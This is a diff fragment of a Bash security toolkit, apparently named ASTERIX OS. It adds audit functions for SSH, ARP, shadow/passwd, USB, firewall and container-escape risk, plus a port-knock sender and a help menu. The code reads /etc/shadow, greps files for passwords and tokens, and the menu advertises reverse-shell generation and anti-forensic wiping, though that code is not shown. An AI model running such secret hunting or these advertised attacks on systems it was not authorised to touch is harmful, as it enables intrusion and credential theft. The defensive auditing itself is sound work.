+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX LOAD AVERAGES, SCHEDULER & SESSION TELEMETRY...${C_RESET}\n"
+    if [ -r "/proc/loadavg" ]; then
+        local l1 l5 l15 procs last_pid
+        read -r l1 l5 l15 procs last_pid < /proc/loadavg
+        echo -e "  ${C_CYAN}Load Average (1m, 5m, 15m):${C_RESET} ${C_GREEN}${l1}${C_RESET}, ${C_YELLOW}${l5}${C_RESET}, ${C_MAGENTA}${l15}${C_RESET}"
+        echo -e "  ${C_CYAN}Active Threads / Entities:${C_RESET}   ${procs}"
+        echo -e "  ${C_CYAN}Latest Allocated PID:${C_RESET}        ${last_pid}"
+    fi
+    
+    echo -e "  ${C_CYAN}Uptime Summary:${C_RESET}              $(uptime 2>/dev/null || true)"
+    echo -e "\n${C_WHITE}${C_BOLD}Active Interactive User Sessions:${C_RESET}"
+    who 2>/dev/null || w 2>/dev/null || echo "  No interactive sessions."
+    echo ""
+}
+
+cmd_json_format() {
+    local target="$1"
+    if [ -z "$target" ]; then
+        echo -e "${C_RED}[!] Error: JSON string or file required.${C_RESET}\nUsage: ax json-format <file.json|'{\"key\":\"val\"}'>"
+        exit 1
+    fi
+    
+    if [ -f "$target" ]; then
+        if command -v jq >/dev/null 2>&1; then
+            jq . "$target"
+        elif command -v python3 >/dev/null 2>&1; then
+            python3 -m json.tool "$target"
+        else
+            cat "$target"
+        fi
+    else
+        if command -v jq >/dev/null 2>&1; then
+            echo "$target" | jq .
+        elif command -v python3 >/dev/null 2>&1; then
+            echo "$target" | python3 -m json.tool
+        else
+            echo "$target"
+        fi
+    fi
+}
+
+cmd_listening() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX DEEP LISTENING SOCKET & SERVICE AUDIT...${C_RESET}\n"
+    if command -v ss >/dev/null 2>&1; then
+        ss -tulnp 2>/dev/null || ss -tuln
+    elif command -v netstat >/dev/null 2>&1; then
+        netstat -tulnp 2>/dev/null || netstat -tuln
+    elif command -v lsof >/dev/null 2>&1; then
+        run_as_root lsof -i -P -n | grep LISTEN
+    else
+        echo -e "${C_YELLOW}[!] No socket inspection utilities (ss/netstat/lsof) detected.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_battery() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX POWER SUPPLY & BATTERY TELEMETRY...${C_RESET}\n"
+    local found=0
+    for b in /sys/class/power_supply/BAT*; do
+        if [ -d "$b" ]; then
+            found=1
+            local cap status tech
+            cap=$(cat "$b/capacity" 2>/dev/null || echo "N/A")
+            status=$(cat "$b/status" 2>/dev/null || echo "N/A")
+            tech=$(cat "$b/technology" 2>/dev/null || echo "N/A")
+            echo -e "  ${C_CYAN}Device:${C_RESET}     $(basename "$b")"
+            echo -e "  ${C_CYAN}Capacity:${C_RESET}   ${C_GREEN}${cap}%${C_RESET}"
+            echo -e "  ${C_CYAN}Status:${C_RESET}     ${C_YELLOW}${status}${C_RESET}"
+            echo -e "  ${C_CYAN}Technology:${C_RESET} ${tech}"
+        fi
+    done
+    
+    if [ "$found" -eq 0 ]; then
+        if command -v termux-battery-status >/dev/null 2>&1; then
+            termux-battery-status
+        elif command -v upower >/dev/null 2>&1; then
+            upower -i "$(upower -e | grep battery | head -n 1)" 2>/dev/null || true
+        else
+            echo -e "  ${C_GRAY}No physical battery or power supply detected (AC power or Virtual Machine).${C_RESET}"
+        fi
+    fi
+    echo ""
+}
+
+cmd_pkg_verify() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX SYSTEM PACKAGE INTEGRITY VERIFICATION...${C_RESET}\n"
+    if command -v debsums >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[*] Auditing installed Debian packages for file alterations via debsums...${C_RESET}"
+        run_as_root debsums -c 2>/dev/null || echo -e "${C_GREEN}[✔] All package checksums verified.${C_RESET}"
+    elif command -v pacman >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[*] Auditing Pacman packages for file alterations...${C_RESET}"
+        pacman -Qk 2>/dev/null | grep -v '0 missing files' || echo -e "${C_GREEN}[✔] All packages intact.${C_RESET}"
+    elif command -v rpm >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[*] Auditing RPM packages for file alterations...${C_RESET}"
+        rpm -Va 2>/dev/null | head -n 25 || echo -e "${C_GREEN}[✔] All packages intact.${C_RESET}"
+    else
+        echo -e "${C_YELLOW}[!] Package integrity tool (debsums/pacman -Qk/rpm -Va) not installed.${C_RESET}"
+        echo -e "${C_GRAY}[i] Install debsums: ax install debsums${C_RESET}"
+    fi
+    echo ""
+}
+
+# ---------------------------------------------------------------------
+# 11. Advanced Offensive & Forensics Modules (v2.8.0)
+# ---------------------------------------------------------------------
+
+cmd_ssh_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX SSH CONFIGURATION AUDITOR...${C_RESET}\n"
+    local cfg="/etc/ssh/sshd_config"
+    if [ ! -f "$cfg" ]; then echo -e "${C_YELLOW}[!] sshd_config not found. SSH server not installed.${C_RESET}"; return 1; fi
+    echo -e "${C_WHITE}${C_BOLD}--- SSHD CONFIG REVIEW ---${C_RESET}"
+    echo -e "${C_YELLOW}[*] PermitRootLogin:${C_RESET}      $(grep -i PermitRootLogin "$cfg" 2>/dev/null | tail -1 || echo 'not set (default: prohibit-password)')"
+    echo -e "${C_YELLOW}[*] PasswordAuthentication:${C_RESET}$(grep -i PasswordAuthentication "$cfg" 2>/dev/null | tail -1 || echo 'not set (default: yes)')"
+    echo -e "${C_YELLOW}[*] PubkeyAuthentication:${C_RESET} $(grep -i PubkeyAuthentication "$cfg" 2>/dev/null | tail -1 || echo 'not set (default: yes)')"
+    echo -e "${C_YELLOW}[*] Port:${C_RESET}                 $(grep -i '^Port ' "$cfg" 2>/dev/null | tail -1 || echo 'not set (default: 22)')"
+    echo -e "${C_YELLOW}[*] AllowUsers:${C_RESET}           $(grep -i AllowUsers "$cfg" 2>/dev/null | tail -1 || echo 'not set (all users allowed)')"
+    echo -e "${C_YELLOW}[*] MaxAuthTries:${C_RESET}         $(grep -i MaxAuthTries "$cfg" 2>/dev/null | tail -1 || echo 'not set (default: 6)')"
+    echo -e "${C_YELLOW}[*] X11Forwarding:${C_RESET}        $(grep -i X11Forwarding "$cfg" 2>/dev/null | tail -1 || echo 'not set')"
+    echo -e "${C_YELLOW}[*] Protocol:${C_RESET}             $(grep -i Protocol "$cfg" 2>/dev/null | tail -1 || echo 'SSH-2 only (default)')"
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- ACTIVE SSH SESSIONS ---${C_RESET}"
+    if command -v ss >/dev/null 2>&1; then
+        ss -tnp | grep ':22 ' 2>/dev/null || echo -e "${C_GREEN}[✔] No active SSH sessions on port 22.${C_RESET}"
+    fi
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- AUTHORIZED KEYS (ALL USERS) ---${C_RESET}"
+    for home in /root /home/*; do
+        local ak="$home/.ssh/authorized_keys"
+        if [ -f "$ak" ]; then
+            local count; count=$(wc -l < "$ak" 2>/dev/null); echo -e "  ${C_YELLOW}$ak${C_RESET} — ${C_BOLD}$count key(s)${C_RESET}"
+        fi
+    done
+    echo ""
+}
+
+cmd_arp_detect() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX ARP SPOOFING DETECTOR...${C_RESET}\n"
+    echo -e "${C_WHITE}${C_BOLD}--- LOCAL ARP CACHE ---${C_RESET}"
+    if command -v arp >/dev/null 2>&1; then
+        arp -n 2>/dev/null | head -n 40
+    elif [ -f /proc/net/arp ]; then
+        cat /proc/net/arp
+    else
+        echo -e "${C_YELLOW}[!] arp command not available.${C_RESET}"
+    fi
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- DUPLICATE MAC DETECTION ---${C_RESET}"
+    if [ -f /proc/net/arp ]; then
+        awk 'NR>1 {print $4}' /proc/net/arp | sort | uniq -d | while read -r mac; do
+            echo -e "${C_RED}[!!] DUPLICATE MAC DETECTED: $mac — Possible ARP poisoning!${C_RESET}"
+        done
+        awk 'NR>1 {print $4}' /proc/net/arp | sort | uniq -D | grep -qv 'DUPLICATE' || echo -e "${C_GREEN}[✔] No duplicate MACs found in ARP cache.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_hexdump() {
+    local file="$1"
+    if [ -z "$file" ]; then echo -e "${C_RED}[!] Usage: ax hexdump <file>${C_RESET}"; return 1; fi
+    if [ ! -f "$file" ]; then echo -e "${C_RED}[!] File not found: $file${C_RESET}"; return 1; fi
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX HEXDUMP VIEWER: $file${C_RESET}\n"
+    if command -v xxd >/dev/null 2>&1; then
+        xxd "$file" | head -n 80
+    elif command -v od >/dev/null 2>&1; then
+        od -A x -t x1z -v "$file" | head -n 80
+    else
+        echo -e "${C_YELLOW}[!] Neither xxd nor od found. Install with: ax install xxd${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_strings_scan() {
+    local target="${1:-.}"
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX STRINGS FORENSIC SCANNER: $target${C_RESET}\n"
+    if ! command -v strings >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[!] strings not installed. ax install binutils${C_RESET}"; return 1
+    fi
+    if [ -f "$target" ]; then
+        echo -e "${C_WHITE}${C_BOLD}--- INTERESTING STRINGS IN $target ---${C_RESET}"
+        strings "$target" | grep -Ei 'http|ftp|password|passwd|secret|token|key|api|sql|exec|eval|base64' | head -n 50
+    else
+        echo -e "${C_WHITE}${C_BOLD}--- SCANNING DIRECTORY: $target ---${C_RESET}"
+        find "$target" -type f \( -name "*.sh" -o -name "*.py" -o -name "*.php" -o -name "*.js" \) 2>/dev/null | while read -r f; do
+            strings "$f" 2>/dev/null | grep -Ei 'password|secret|token|api.key' | head -n 5 | while read -r s; do
+                echo -e "  ${C_YELLOW}$f${C_RESET}: ${C_RED}$s${C_RESET}"
+            done
+        done
+    fi
+    echo ""
+}
+
+cmd_shadow_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX SHADOW/PASSWD FILE SECURITY AUDIT...${C_RESET}\n"
+    echo -e "${C_WHITE}${C_BOLD}--- ACCOUNTS WITH EMPTY PASSWORDS ---${C_RESET}"
+    run_as_root awk -F: '($2 == "" || $2 == "!") {print "  [!] " $1 ": NO/LOCKED PASSWORD"}' /etc/shadow 2>/dev/null || echo "  (need root)"
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- UID 0 ACCOUNTS (POTENTIAL BACKDOORS) ---${C_RESET}"
+    awk -F: '($3 == 0) {print "  [!!] UID-0: " $1}' /etc/passwd 2>/dev/null
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- USERS WITH SHELL ACCESS ---${C_RESET}"
+    awk -F: '($7 !~ /(nologin|false|sync|halt|shutdown)/) {print "  " $1 " -> " $7}' /etc/passwd 2>/dev/null
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- PASSWD FILE PERMISSIONS ---${C_RESET}"
+    ls -la /etc/passwd /etc/shadow 2>/dev/null
+    echo ""
+}
+
+cmd_usb_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX USB DEVICE SECURITY AUDIT...${C_RESET}\n"
+    echo -e "${C_WHITE}${C_BOLD}--- CURRENTLY CONNECTED USB DEVICES ---${C_RESET}"
+    if command -v lsusb >/dev/null 2>&1; then
+        lsusb 2>/dev/null
+    else
+        echo -e "${C_YELLOW}[!] lsusb not found. ax install usbutils${C_RESET}"
+    fi
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- USB STORAGE MOUNTS ---${C_RESET}"
+    lsblk -o NAME,TYPE,SIZE,MOUNTPOINT,LABEL 2>/dev/null | grep -i 'disk\|part\|usb' || cat /proc/mounts 2>/dev/null | grep -i 'usb\|sd[b-z]'
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- USB DEVICE KERNEL LOG (LAST 25 EVENTS) ---${C_RESET}"
+    dmesg 2>/dev/null | grep -i 'usb\|mass storage' | tail -n 25 || echo -e "${C_GRAY}[i] No USB events in dmesg (may need root).${C_RESET}"
+    echo ""
+}
+
+cmd_dmesg_watch() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX KERNEL RING BUFFER MONITOR...${C_RESET}\n"
+    echo -e "${C_WHITE}${C_BOLD}--- RECENT KERNEL SECURITY EVENTS ---${C_RESET}"
+    dmesg 2>/dev/null | grep -Ei 'error|fail|warn|oom|killed|segfault|null pointer|panic|attack|denied|blocked|firewall|iptable|nftable|audit' | tail -n 40 || echo -e "${C_GREEN}[✔] No critical kernel events found.${C_RESET}"
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- HARDWARE ERRORS ---${C_RESET}"
+    dmesg 2>/dev/null | grep -i 'hardware error\|mce\|ecc\|edac' | tail -n 10 || echo -e "${C_GREEN}[✔] No hardware errors detected.${C_RESET}"
+    echo ""
+}
+
+cmd_net_neighbors() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX NETWORK NEIGHBORS & ARP TABLE...${C_RESET}\n"
+    echo -e "${C_WHITE}${C_BOLD}--- IP NEIGHBOR TABLE (ARP/NDP) ---${C_RESET}"
+    if command -v ip >/dev/null 2>&1; then
+        ip neigh show 2>/dev/null | while read -r line; do
+            if echo "$line" | grep -q 'REACHABLE'; then
+                echo -e "  ${C_GREEN}$line${C_RESET}"
+            elif echo "$line" | grep -q 'STALE\|FAILED'; then
+                echo -e "  ${C_YELLOW}$line${C_RESET}"
+            else
+                echo -e "  $line"
+            fi
+        done
+    else
+        arp -a 2>/dev/null || cat /proc/net/arp
+    fi
+    echo ""
+}
+
+cmd_nft_rules() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX NFTABLES/IPTABLES FIREWALL RULESET...${C_RESET}\n"
+    if command -v nft >/dev/null 2>&1; then
+        echo -e "${C_WHITE}${C_BOLD}--- NFTABLES RULESET ---${C_RESET}"
+        run_as_root nft list ruleset 2>/dev/null || echo -e "${C_YELLOW}[!] Need root or nftables not configured.${C_RESET}"
+    fi
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- IPTABLES RULES (filter) ---${C_RESET}"
+    if command -v iptables >/dev/null 2>&1; then
+        run_as_root iptables -L -n -v 2>/dev/null | head -n 50 || echo -e "${C_YELLOW}[!] Need root for iptables.${C_RESET}"
+    fi
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- UFW STATUS ---${C_RESET}"
+    if command -v ufw >/dev/null 2>&1; then
+        run_as_root ufw status verbose 2>/dev/null || echo -e "${C_YELLOW}[!] Need root for ufw.${C_RESET}"
+    else
+        echo -e "${C_GRAY}[i] UFW not installed.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_syscall_trace() {
+    local pid="$1"
+    if [ -z "$pid" ]; then echo -e "${C_RED}[!] Usage: ax syscall-trace <PID>${C_RESET}"; return 1; fi
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX SYSCALL TRACER — PID: $pid${C_RESET}\n"
+    if command -v strace >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}[*] Attaching strace to PID $pid (Ctrl+C to stop)...${C_RESET}\n"
+        run_as_root strace -p "$pid" -e trace=network,file,process,signal -T 2>&1 | head -n 60
+    elif [ -d "/proc/$pid" ]; then
+        echo -e "${C_YELLOW}[!] strace not installed. Showing /proc/$pid info instead.${C_RESET}\n"
+        echo -e "${C_WHITE}Status:${C_RESET}"; cat "/proc/$pid/status" 2>/dev/null | head -n 20
+        echo -e "${C_WHITE}Open FDs:${C_RESET}"; ls -la "/proc/$pid/fd" 2>/dev/null | head -n 20
+        echo -e "${C_WHITE}Maps:${C_RESET}"; head -n 15 "/proc/$pid/maps" 2>/dev/null
+    else
+        echo -e "${C_RED}[!] PID $pid not found.${C_RESET}"
+    fi
+    echo ""
+}
+
+cmd_open_files() {
+    local target="${1:-}"
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX OPEN FILE DESCRIPTOR AUDIT...${C_RESET}\n"
+    if command -v lsof >/dev/null 2>&1; then
+        if [ -n "$target" ]; then
+            echo -e "${C_WHITE}${C_BOLD}--- OPEN FILES FOR: $target ---${C_RESET}"
+            lsof -u "$target" 2>/dev/null | head -n 40
+        else
+            echo -e "${C_WHITE}${C_BOLD}--- TOP PROCESSES BY OPEN FILE DESCRIPTORS ---${C_RESET}"
+            lsof 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -rn | head -n 20
+            echo ""
+            echo -e "${C_WHITE}${C_BOLD}--- OPEN NETWORK SOCKETS ---${C_RESET}"
+            lsof -i 2>/dev/null | grep -E 'ESTABLISHED|LISTEN' | head -n 30
+        fi
+    else
+        echo -e "${C_WHITE}${C_BOLD}--- OPEN FILE DESCRIPTORS (/proc) ---${C_RESET}"
+        for pid in /proc/[0-9]*/fd; do
+            local count; count=$(ls "$pid" 2>/dev/null | wc -l)
+            if [ "$count" -gt 50 ] 2>/dev/null; then
+                local name; name=$(cat "$(dirname $pid)/comm" 2>/dev/null)
+                echo -e "  PID $(basename $(dirname $pid)) ($name): ${C_YELLOW}$count FDs${C_RESET}"
+            fi
+        done
+    fi
+    echo ""
+}
+
+cmd_container_escape() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX CONTAINER ESCAPE RISK ASSESSMENT...${C_RESET}\n"
+    echo -e "${C_WHITE}${C_BOLD}--- ENVIRONMENT DETECTION ---${C_RESET}"
+    local in_container=0
+    if [ -f /.dockerenv ]; then echo -e "  ${C_RED}[!!] Running INSIDE a Docker container (.dockerenv found)${C_RESET}"; in_container=1; fi
+    if [ -f /run/.containerenv ]; then echo -e "  ${C_RED}[!!] Running INSIDE a Podman/OCI container (.containerenv found)${C_RESET}"; in_container=1; fi
+    if grep -q 'docker\|lxc\|containerd\|kubepods' /proc/1/cgroup 2>/dev/null; then
+        echo -e "  ${C_RED}[!!] cgroup fingerprint indicates container environment${C_RESET}"; in_container=1
+    fi
+    [ "$in_container" -eq 0 ] && echo -e "  ${C_GREEN}[✔] Not running inside a container.${C_RESET}"
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- PRIVILEGED/CAPABILITY CHECKS ---${C_RESET}"
+    if command -v capsh >/dev/null 2>&1; then capsh --print 2>/dev/null | head -n 10; fi
+    grep -i cap_sys_admin /proc/self/status 2>/dev/null || true
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- HOST FILESYSTEM MOUNT LEAKS ---${C_RESET}"
+    cat /proc/mounts 2>/dev/null | grep -v 'overlay\|tmpfs\|proc\|sysfs\|devpts\|cgroup' | head -n 15
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- WRITABLE HOST PATHS ---${C_RESET}"
+    for mp in /host /proc/sysrq-trigger /var/run/docker.sock /run/docker.sock; do
+        [ -e "$mp" ] && echo -e "  ${C_RED}[!!] Dangerous path accessible: $mp${C_RESET}" || true
+    done
+    echo ""
+}
+
+cmd_port_knock() {
+    local host="${1:-localhost}"
+    local ports="${2:-7000,8000,9000}"
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX PORT KNOCK SEQUENCE: $host [$ports]${C_RESET}\n"
+    IFS=',' read -ra plist <<< "$ports"
+    for p in "${plist[@]}"; do
+        echo -e "  ${C_YELLOW}[>] Knocking $host:$p ...${C_RESET}"
+        if command -v nc >/dev/null 2>&1; then
+            nc -z -w 1 "$host" "$p" 2>/dev/null || true
+        else
+            timeout 1 bash -c "echo >/dev/tcp/$host/$p" 2>/dev/null || true
+        fi
+        sleep 0.5
+    done
+    echo -e "\n${C_GREEN}[✔] Port knock sequence complete.${C_RESET}\n"
+}
+
+cmd_mem_regions() {
+    local pid="${1:-self}"
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX PROCESS MEMORY MAP — PID: $pid${C_RESET}\n"
+    local mapfile="/proc/$pid/maps"
+    if [ ! -f "$mapfile" ]; then echo -e "${C_RED}[!] PID $pid not found or no access.${C_RESET}"; return 1; fi
+    echo -e "${C_WHITE}${C_BOLD}--- MEMORY REGIONS ---${C_RESET}"
+    awk '{
+        split($1, a, "-");
+        start=strtonum("0x"a[1]); end=strtonum("0x"a[2]);
+        size=(end-start)/1024;
+        printf "  %-20s %s  %7.1f KB  %s\n", $1, $2, size, $6
+    }' "$mapfile" 2>/dev/null | head -n 40
+    echo ""
+    echo -e "${C_WHITE}${C_BOLD}--- MEMORY STATS ---${C_RESET}"
+    cat "/proc/$pid/status" 2>/dev/null | grep -E 'VmSize|VmRSS|VmSwap|VmPeak|VmData|VmStk' | while read -r line; do
+        echo -e "  $line"
+    done
+    echo ""
+}
+
+# ---------------------------------------------------------------------
+# 10. Help, List & Command Cheatsheet
+# ---------------------------------------------------------------------
+
+cmd_list() {
+    print_banner
+    echo -e "${C_WHITE}${C_BOLD}ASTERIX OS COMMAND REPERTOIRE (150+ Specialized Suites & Omni-Dispatcher):${C_RESET}\n"
+    echo -e "  ${C_CYAN}${C_BOLD}[1] System & Packages:${C_RESET} update, upgrade, install, remove, search, clean, build, doctor, status, version, cpu, disk, mem, ps, benchmark, service, sysfetch, pstree, env-audit, disk-io, uptime-stats, battery, pkg-verify"
+    echo -e "  ${C_CYAN}${C_BOLD}[2] Network & OSINT:${C_RESET}   ip, ports, ping, scan, netrecon, mac, webrecon, dns, whois, traceroute, arp, connections, subdomains, banner-grab, speedtest, traffic, ip-geo, net-route, listening, net-neighbors, arp-detect"
+    echo -e "  ${C_CYAN}${C_BOLD}[3] Defense & Hardening:${C_RESET}hash, shred, rootkit, trace, vuln, packet, logwatch, firewall, audit, suid, certs, stealth, killswitch, malware-scan, docker-audit, kernel-hardening, cis-audit, fim-init, fim-check, auth-audit, git-secrets, tls-audit, cron-audit, ssh-audit, shadow-audit, usb-audit, nft-rules, container-escape"
+    echo -e "  ${C_CYAN}${C_BOLD}[4] Cyber Warfare:${C_RESET}     matrix, decoy, payload, wifi-scan, sniff-live, tor-status, quote, port-knock"
+    echo -e "  ${C_CYAN}${C_BOLD}[5] Crypto & Encoding:${C_RESET} b64enc, b64dec, hexenc, hexdec, genpass, entropy, encrypt, decrypt, qr, cert-create, json-format"
+    echo -e "  ${C_CYAN}${C_BOLD}[6] Forensics & Tracing:${C_RESET}hexdump, strings-scan, syscall-trace, open-files, mem-regions, dmesg-watch, exif"
+    echo -e "  ${C_CYAN}${C_BOLD}[7] Vault & Workspace:${C_RESET} backup, loot, scaffold, env, wallpaper, hud, top, compress, extract, find-large"
+    echo -e "  ${C_CYAN}${C_BOLD}[8] Cyber Subsystems:${C_RESET}  recon, web, exploit, crack, sniff, wifi, forensics, rev, dev, quad, portal, discord, cloud, vault, shell"
+    echo -e "\n  ${C_YELLOW}${C_BOLD}⚡ OMNI-DISPATCHER:${C_RESET} Any standard tool (e.g. 'ax nmap', 'ax curl', 'ax git', 'ax hydra') is automatically wrapped and executed!"
+    echo ""
+}
+
+cmd_help() {
+    print_banner
+    echo -e "${C_WHITE}${C_BOLD}USAGE:${C_RESET}"
+    echo -e "  ${C_CYAN}ax${C_RESET} <command> [arguments...]"
+    echo -e "  ${C_CYAN}asterix${C_RESET} <command> [arguments...]\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}CORE SYSTEM & PACKAGE OPERATIONS:${C_RESET}"
+    echo -e "  ${C_GREEN}ax update${C_RESET}               Refresh package indexes, git core & security databases"
+    echo -e "  ${C_GREEN}ax upgrade${C_RESET}              Full upgrade: OS packages, C/C++/Go/Asm/Rust toolchains"
+    echo -e "  ${C_GREEN}ax install <pkgs>${C_RESET}       Install packages automatically via system package manager"
+    echo -e "  ${C_GREEN}ax remove <pkgs>${C_RESET}        Uninstall specified packages"
+    echo -e "  ${C_GREEN}ax search <query>${C_RESET}       Search package repositories"
+    echo -e "  ${C_GREEN}ax clean${C_RESET}                Purge unused packages, build artifacts & system cache"
+    echo -e "  ${C_GREEN}ax build${C_RESET}                Compile all native multi-language tool suites"
+    echo -e "  ${C_GREEN}ax doctor${C_RESET}               Run deep diagnostics on compilers, tools & storage"
+    echo -e "  ${C_GREEN}ax status${C_RESET}               Display live system telemetry HUD (Node, IP, Storage)"
+    echo -e "  ${C_GREEN}ax sysfetch${C_RESET}             Cyberpunk ASCII system information neofetch display"
+    echo -e "  ${C_GREEN}ax list${C_RESET}                 View all available ASTERIX OS commands"
+    echo -e "  ${C_GREEN}ax version${C_RESET}              Show ASTERIX OS release information\n"
+
+    echo -e "${C_WHITE}${C_BOLD}TACTICAL CYBER WARFARE, DECEPTION & ANTI-FORENSICS:${C_RESET}"
+    echo -e "  ${C_RED}ax matrix${C_RESET}               Stream cyberpunk animated digital rain visualizer"
+    echo -e "  ${C_RED}ax stealth${C_RESET}              Engage Ghost Mode: Wipes history, temp files, caches & RAM"
+    echo -e "  ${C_RED}ax killswitch [restore]${C_RESET} Sever all RF/ethernet, drop iptables & isolate system"
+    echo -e "  ${C_RED}ax decoy [port]${C_RESET}         Deploy honeypot listener to detect & log adversary probes"
+    echo -e "  ${C_RED}ax payload <ip> <port>${C_RESET}  Generate multi-language reverse shell one-liners"
+    echo -e "  ${C_RED}ax malware-scan [dir]${C_RESET}   Audit directory for webshells, base64 evals & persistence"
+    echo -e "  ${C_RED}ax tor-status${C_RESET}           Verify Tor onion routing, SOCKS5 proxy & identity leaks"
+    echo -e "  ${C_RED}ax quote${C_RESET}                Display cybernetic hacker ethos inspiration\n"
+
+    echo -e "${C_WHITE}${C_BOLD}NETWORK & OSINT RECONNAISSANCE:${C_RESET}"
+    echo -e "  ${C_YELLOW}ax ip${C_RESET}                   Display LAN IP, WAN public IP, interfaces & gateway"
+    echo -e "  ${C_YELLOW}ax ports${C_RESET}                Audit open listening TCP/UDP sockets and processes"
+    echo -e "  ${C_YELLOW}ax ping <target>${C_RESET}        Cybernetic ICMP latency probe"
+    echo -e "  ${C_YELLOW}ax scan <target>${C_RESET}        Rapid port and service scanner"
+    echo -e "  ${C_YELLOW}ax netrecon [subnet]${C_RESET}    Automated network discovery & diagnostic reporter"
+    echo -e "  ${C_YELLOW}ax subdomains <domain>${C_RESET}  Passive CT subdomain enumeration (crt.sh)"
+    echo -e "  ${C_YELLOW}ax banner-grab <host>${C_RESET}   Raw TCP socket daemon banner grabber"
+    echo -e "  ${C_YELLOW}ax wifi-scan${C_RESET}            Scan wireless spectrum, SSIDs, BSSIDs & channels"
+    echo -e "  ${C_YELLOW}ax sniff-live [iface]${C_RESET}   Live terminal packet sniffer radar"
+    echo -e "  ${C_YELLOW}ax speedtest${C_RESET}            Benchmark network throughput and ICMP latency"
+    echo -e "  ${C_YELLOW}ax mac [iface]${C_RESET}          Inspect or randomize/spoof interface MAC address"
+    echo -e "  ${C_YELLOW}ax webrecon <url>${C_RESET}       High-performance Go web reconnaissance engine"
+    echo -e "  ${C_YELLOW}ax dns <domain>${C_RESET}         Resolve DNS records (A, MX, TXT) with latency"
+    echo -e "  ${C_YELLOW}ax whois <domain>${C_RESET}       Query registrar and ASN allocation details"
+    echo -e "  ${C_YELLOW}ax traceroute <ip>${C_RESET}      Map network routing hops\n"
+
+    echo -e "${C_WHITE}${C_BOLD}NETWORK INTELLIGENCE & TELEMETRY:${C_RESET}"
+    echo -e "  ${C_YELLOW}ax ip-geo \u003cip\u003e${C_RESET}          Geolocate any IP: city, country, ASN, org, lat/lon"
+    echo -e "  ${C_YELLOW}ax net-route${C_RESET}            Display kernel routing table and interface gateway map"
+    echo -e "  ${C_YELLOW}ax listening${C_RESET}            Deep socket audit — all bound ports, PIDs, protocols\n"
+
+    echo -e "${C_WHITE}${C_BOLD}SECURITY, CRYPTO & FORENSICS:${C_RESET}"
+    echo -e "  ${C_MAGENTA}ax encrypt <file>${C_RESET}       AES-256-CBC cryptographic file encryption"
+    echo -e "  ${C_MAGENTA}ax decrypt <file>${C_RESET}       AES-256-CBC cryptographic file decryption"
+    echo -e "  ${C_MAGENTA}ax hash <file|str>${C_RESET}      Multi-hash calculator (MD5, SHA-1, SHA-256, SHA-512)"
+    echo -e "  ${C_MAGENTA}ax shred <file>${C_RESET}         Cryptographic multi-pass secure file obliteration"
+    echo -e "  ${C_MAGENTA}ax exif <file> [--strip]${C_RESET}Forensic metadata inspection & sanitization"
+    echo -e "  ${C_MAGENTA}ax rootkit${C_RESET}              Scan for anomalous kernel modules and hidden procs"
+    echo -e "  ${C_MAGENTA}ax docker-audit${C_RESET}        Inspect Docker containers, sockets & escape risks"
+    echo -e "  ${C_MAGENTA}ax trace [pid]${C_RESET}          Live syscall monitor and process tracer"
+    echo -e "  ${C_MAGENTA}ax vuln [target]${C_RESET}        Cyber vulnerability assessment scanner"
+    echo -e "  ${C_MAGENTA}ax packet${C_RESET}               Interactive raw packet crafting and injection"
+    echo -e "  ${C_MAGENTA}ax logwatch${C_RESET}             Real-time security log and auth anomaly watcher"
+    echo -e "  ${C_MAGENTA}ax firewall${C_RESET}             Inspect active packet filter and firewall rules"
+    echo -e "  ${C_MAGENTA}ax audit${C_RESET}                Automated Linux security & hardening audit"
+    echo -e "  ${C_MAGENTA}ax suid${C_RESET}                 Scan filesystem for suspicious SUID binaries"
+    echo -e "  ${C_MAGENTA}ax certs <host>${C_RESET}         Inspect remote SSL/TLS certificate chain"
+    echo -e "  ${C_MAGENTA}ax genpass [len]${C_RESET}        Generate high-entropy cryptographic password"
+    echo -e "  ${C_MAGENTA}ax entropy <file>${C_RESET}       Detect packed, encrypted or obfuscated binaries"
+    echo -e "  ${C_MAGENTA}ax qr <text|url>${C_RESET}        Generate terminal ASCII QR code\n"
+
